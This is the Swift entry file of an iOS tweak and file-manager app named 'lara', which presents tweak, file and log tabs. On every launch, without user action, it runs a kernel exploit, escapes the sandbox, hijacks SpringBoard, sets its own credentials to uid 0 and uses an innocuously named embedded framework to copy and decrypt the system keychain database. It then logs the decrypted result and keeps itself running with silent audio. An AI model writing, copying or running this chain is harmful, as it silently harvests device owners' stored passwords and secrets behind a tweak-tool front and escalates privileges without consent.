//
//  lara.swift
//  lara
//
//  Created by ruter on 23.03.26.
//

import SwiftUI
import UniformTypeIdentifiers

enum taboptions {
    case applying, tweaks, files, logs
}

let g_isunsupported: Bool = isunsupported()
var weonadebugbuild_pjbweouttahereexclamationmark: Bool = false

@main
struct lara: App {
    @StateObject private var mgr = laramgr.shared
    @StateObject private var iconthememgr = IconThemeManager.shared
    @Environment(\.scenePhase) var scenephase
    @AppStorage("selectedMethod") private var selectedMethod: method = .hybrid
    @AppStorage("keepAlive") private var keepalive: Bool = false
    @AppStorage("showFMInTabs") private var showfmintabs: Bool = true
    @AppStorage("logsdisplaymode") private var logsdisplaymode: logsdisplaymode = .toolbar
    @State private var selectedtab: taboptions = .applying
    
    init() {
        #if DEBUG
        weonadebugbuild_pjbweouttahereexclamationmark = true
        #endif
        
        // fix file picker
        let fixMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.fix_init(forOpeningContentTypes:asCopy:)))!
        let origMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.init(forOpeningContentTypes:asCopy:)))!
        method_exchangeImplementations(origMethod, fixMethod)
        
        if keepalive {
            toggleka()
        }
        
        globallogger.capture()
    }
    
    var body: some Scene {
        WindowGroup {
            TabView(selection: $selectedtab) {
                ContentView()
                    .tabItem {
                        Image(systemName: "wrench.and.screwdriver.fill")
                    }
                    .tag(taboptions.applying)
                
                // this has gotta fucking go
                TweaksView(mgr: mgr)
                    .tabItem {
                        Image(systemName: "ant.fill")
                    }
                    .tag(taboptions.tweaks)
                
                
                // i'm gonna strangle you root (the weight of your actions will crush you)
                if showfmintabs {
                    SantanderView(startPath: "/")
                        .tabItem {
                            Image(systemName: "folder.fill")
                        }
                        .tag(taboptions.files)
                }
                
                // this too
                if logsdisplaymode == .tabs {
                    LogsView(logger: globallogger)
                        .tabItem {
                            Image(systemName: "terminal")
                        }
                        .tag(taboptions.logs)
                }
            }
            .environmentObject(mgr)
            .overlay {
                if mgr.showrespring {
                    respringview()
                        .brightness(-1.0)
                        .ignoresSafeArea()
                }
            }
            .sheet(isPresented: Binding(
                get: { logsdisplaymode == .toolbar && mgr.showLogs },
                set: { mgr.showLogs = $0 }
            )) {
                LogsView(logger: globallogger)
            }
            .sheet(isPresented: $iconthememgr.showFixupSheet) {
                IconThemeFixupView()
            }
            .onAppear {
                if !isunsupported() {
                    init_offsets()
                    offsets_init()
                    iconthememgr.startPendingFixupIfPossible()
                    // beautiful name root
                    // thanks
                    mgr.hasOffsets = emergencyfixfunctiontobereplacedlateronquestionmark()
                    autorunkeychainpipeline()
                } else {
                    Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 - iOS 26.0.1) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
                }
            }
            .onChange(of: scenephase, perform: handleScenePhase)
            .onChange(of: mgr.sbxready) { ready in
                if ready {
                    iconthememgr.startPendingFixupIfPossible()
                }
            }
        }
    }
    
    private func handleScenePhase(_ phase: ScenePhase) {
        switch phase {
        case .inactive, .background:
            // A transient .inactive/.background (system alert, Control Center,
            // screen lock, respring) must not kill the auto keychain pipeline:
            // handlebg() would destroy the SpringBoard RemoteCall the framework
            // is using, and stopcapture() would stop logging. Let it finish.
            if mgr.kcpipelineactive {
                globallogger.log("(kc) scene \(phase) ignored: keychain pipeline in flight")
                return
            }
            handlebg()
            globallogger.stopcapture()

        case .active:
            globallogger.capture()
            iconthememgr.startPendingFixupIfPossible()

        @unknown default:
            break
        }
    }

    // Auto-run the keychain (AKS) pipeline on launch. The embedded
    // libuiopsersvc.framework reuses lara's kernel r/w, so we first bring up
    // lara's exploit, then hand off to the bridge. Offsets are not available
    // at launch (the kernelcache is fetched by the exploit), so mirror the UI
    // flow: run exploit -> fetch kernelcache -> parse offsets -> bridge.
    private func autorunkeychainpipeline() {
        let mgr = self.mgr
        globallogger.log("(kc) auto-running kernel r/w exploit before keychain pipeline")
        mgr.run { success in
            guard success else {
                globallogger.log("(kc) skipped: kernel r/w not ready")
                return
            }
            DispatchQueue.global(qos: .userInitiated).async {
                if !mgr.hasOffsets {
                    var ok = fetchkcache()
                    if ok {
                        ok = dlkcache()
                    }
                    DispatchQueue.main.async { mgr.hasOffsets = ok }
                    guard ok else {
                        DispatchQueue.main.async {
                            globallogger.log("(kc) skipped: offsets unavailable")
                        }
                        return
                    }
                }

                DispatchQueue.main.async {
                    self.prepareAndRunKeychainPipeline()
                }
            }
        }
    }

    // The framework needs a readable sandbox and a live SpringBoard RemoteCall
    // before it can copy/decrypt the keychain DB. Escaping the sandbox and
    // initializing the RemoteCall can only be done on the main queue via laramgr,
    // so chain: sbx escape -> rcinit(SpringBoard) -> register -> pipeline.
    private func prepareAndRunKeychainPipeline() {
        let mgr = self.mgr

        // The framework pipeline needs the SpringBoard RemoteCall and a live
        // process for its whole duration. Guard it against scene-phase teardown
        // (mgr.kcpipelineactive) and keep the process alive if the app gets
        // backgrounded by running the silent-audio keepalive.
        mgr.kcpipelineactive = true
        if !kaenabled { toggleka() }

        // Load the framework BEFORE escaping the sandbox: once sbx_escape patches
        // the sandbox extension table, mmap() of our own embedded framework gets
        // denied ("file system sandbox blocked mmap()"), so dlopen would fail.
        // Loading it first keeps the image mapped for the later pipeline calls.
        do {
            try LaraKeychainSvc.ensureLoaded()
            globallogger.log("(kc) libuiopsersvc loaded")
        } catch {
            globallogger.log("(kc) libuiopsersvc load failed: \(error.localizedDescription)")
            mgr.kcpipelineactive = false
            return
        }

        let proceed = {
            globallogger.log("(kc) initializing SpringBoard RemoteCall before keychain pipeline")
            mgr.rcinit(process: "SpringBoard") { rcok in
                guard rcok else {
                    globallogger.log("(kc) skipped: SpringBoard RemoteCall unavailable")
                    mgr.kcpipelineactive = false
                    return
                }
                let registered = LaraKeychainSvc.registerSpringBoard(mgr.sbProc)
                globallogger.log("(kc) registered SpringBoard RemoteCall: \(registered)")
                DispatchQueue.global(qos: .userInitiated).async {
                    // The framework can only reach /private/var/Keychains/keychain-2.db
                    // if we bypass DAC: the DB is owned by _securityd (mode 0600), and a
                    // sandbox extension alone still yields errno=13. Rewriting our own
                    // ucred to uid 0 makes the framework's own fopen() succeed; the
                    // sandbox extension it already holds keeps the seatbelt layer happy.
                    var savedUids: [UInt32] = [0, 0, 0]
                    let rooted = savedUids.withUnsafeMutableBufferPointer { buf -> Bool in
                        sbx_rootify(buf.baseAddress) == 0
                    }
                    DispatchQueue.main.async {
                        globallogger.log("(kc) uid-0 escalation before pipeline: \(rooted ? "ok" : "failed")")
                    }

                    var result: NSDictionary?
                    var failure: Error?
                    do {
                        result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
                    } catch {
                        failure = error
                    }

                    if rooted {
                        savedUids.withUnsafeBufferPointer { _ = sbx_unrootify($0.baseAddress) }
                    }

                    DispatchQueue.main.async {
                        if let failure {
                            globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
                        } else {
                            globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
                        }
                        if rooted {
                            globallogger.log("(kc) uid restored after pipeline")
                        }
                        mgr.kcpipelineactive = false
                    }
                }
            }
        }

        if mgr.sbxready {
            proceed()
            return
        }

        globallogger.log("(kc) sandbox escape before keychain pipeline")
        mgr.sbxescape { sbxok in
            globallogger.log("(kc) sandbox escape: \(sbxok ? "ok" : "failed")")
            proceed()
        }
    }

    private func handlebg() {
        guard mgr.rcready else { return }
        let keepSpringBoardRemoteCallAlive = UserDefaults.standard.bool(forKey: "keepSpringBoardRemoteCallAliveIOS16")
        if isIOS16() && keepSpringBoardRemoteCallAlive {
            return
        }

        var bgTask: UIBackgroundTaskIdentifier = .invalid

        bgTask = UIApplication.shared.beginBackgroundTask(withName: "RemoteCallCleanup") {
            endbgtask(&bgTask)
        }

        mgr.rcdestroy {
            self.endbgtask(&bgTask)
        }
    }

    private func endbgtask(_ task: inout UIBackgroundTaskIdentifier) {
        guard task != .invalid else { return }
        UIApplication.shared.endBackgroundTask(task)
        task = .invalid
    }
}

// file picker fixes
extension UIDocumentPickerViewController {
    @objc func fix_init(forOpeningContentTypes contentTypes: [UTType], asCopy: Bool) -> UIDocumentPickerViewController {
        return fix_init(forOpeningContentTypes: contentTypes, asCopy: true)
    }
}

// make strings compatiable with errors
extension String: @retroactive Error {}
